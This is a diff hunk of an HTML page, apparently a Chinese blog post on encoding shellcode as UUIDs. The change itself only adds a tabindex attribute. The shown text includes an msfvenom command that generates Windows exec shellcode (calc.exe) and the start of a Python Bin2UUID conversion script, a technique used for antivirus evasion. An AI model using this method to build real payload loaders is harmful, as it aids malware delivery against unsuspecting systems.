@@ -111,7 +111,7 @@
 <p>UUID 代表了 -&gt; <code>typedef GUID UUID;</code></p>
 <h2 id="0x03-uuid-测试">0x03 UUID 测试</h2>
 <h3 id="生成shellcode">生成Shellcode</h3>
-<pre><code>./msfvenom -p windows/exec CMD=calc.exe -b '\xfc\xe8' -f raw -o /tmp/shellcode.bin
+<pre tabindex="0"><code>./msfvenom -p windows/exec CMD=calc.exe -b '\xfc\xe8' -f raw -o /tmp/shellcode.bin
 </code></pre><h3 id="bin2uuid">Bin2UUID</h3>
 <p>生成脚本：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> uuid <span style="color:#f92672">import</span> UUID
